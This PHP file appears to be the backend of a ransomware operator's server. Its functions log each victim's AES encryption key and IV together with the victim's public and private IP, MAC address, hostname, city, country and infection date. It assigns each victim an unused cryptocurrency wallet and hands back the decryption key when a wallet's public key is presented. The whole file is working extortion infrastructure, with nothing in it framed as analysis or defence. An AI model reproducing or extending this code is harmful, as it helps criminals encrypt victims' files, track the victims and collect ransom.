
<?php

function saveKeyDB($id, $key, $iv, $pub_ip, $priv_ip, $mac, $hostname, $infos)
{
    require ("./config/db_connect.php");
    $stmt = $pdo->prepare("INSERT INTO Victim (AesKey, IV, PUB_IP, PRIV_IP, MAC, Hostname, City, Region, Country, WalletID, InfectionDate)
            VALUES (:AESKey, :iv, :pub_ip, :priv_ip, :mac, :Hostname, :City, :Region, :Country, :WalletID, NOW())");
    $stmt->bindParam(':AESKey', $key);
    $stmt->bindParam(':iv', $iv);
    $stmt->bindParam(':pub_ip', $pub_ip);
    $stmt->bindParam(':priv_ip', $priv_ip);
    $stmt->bindParam(':mac', $mac);
    $stmt->bindParam(':Hostname', $hostname);
    $stmt->bindParam(':City', $infos[0]);
    $stmt->bindParam(':Region', $infos[1]);
    $stmt->bindParam(':Country', $infos[2]);
    $stmt->bindParam(':WalletID', $id);
    $stmt->execute();
}

function check_exist($pub_ip, $priv_ip, $mac, $hostname)
{
    require ("./config/db_connect.php");
    $stmt = $pdo->prepare("SELECT VictimID 
                            FROM Victim 
                            WHERE PUB_IP = :pub_ip
                            AND PRIV_IP = :priv_ip
                            AND MAC = :mac
                            AND Hostname = :Hostname");
    $stmt->bindParam(':pub_ip', $pub_ip);
    $stmt->bindParam(':priv_ip', $priv_ip);
    $stmt->bindParam(':mac', $mac);
    $stmt->bindParam(':Hostname', $hostname);
    if ($stmt->execute())
        if (($stmt->fetch()))
            return "TRUE";
    return "FALSE";
}

function getNewIdDB()
{
    require ("./config/db_connect.php");
    $stmt = $pdo->prepare("SELECT WalletID FROM Wallet WHERE WalletID NOT IN 
                            (SELECT WalletID FROM Victim WHERE WalletID IS NOT NULL)
                            LIMIT 1");
    if ($stmt->execute())
        return $stmt->fetch();
    return NULL;
}

function getPublicKeyDB($id)
{
    require ("./config/db_connect.php");
    $stmt = $pdo->prepare("SELECT Public_Key FROM Wallet WHERE WalletID = :id");
    $stmt->bindParam(':id', $id);
    if ($stmt->execute())
        return $stmt->fetch();
    return NULL;
}

function getAesKeyDB($id)
{
    require ("./config/db_connect.php");
    $stmt = $pdo->prepare("SELECT AesKey FROM Victim WHERE WalletID IN 
                            (SELECT WalletID FROM Wallet WHERE Public_Key = :id)");
    $stmt->bindParam(':id', $id);
    if ($stmt->execute())
        return $stmt->fetch();
    return NULL;
}

function getIvDB($id)
{
    require ("./config/db_connect.php");
    $stmt = $pdo->prepare("SELECT IV FROM Victim WHERE WalletID IN 
                            (SELECT WalletID FROM Wallet WHERE Public_Key = :id)");
    $stmt->bindParam(':id', $id);
    if ($stmt->execute())
        return $stmt->fetch();
    return NULL;
}

function idExistDB($id)
{
    require ("./config/db_connect.php");
    $stmt = $pdo->prepare("SELECT WalletID FROM Wallet WHERE Public_Key = :id");
    $stmt->bindParam(':id', $id);
    if ($stmt->execute())
        if (($stmt->fetch()))
            return true;
    return false;
}

?>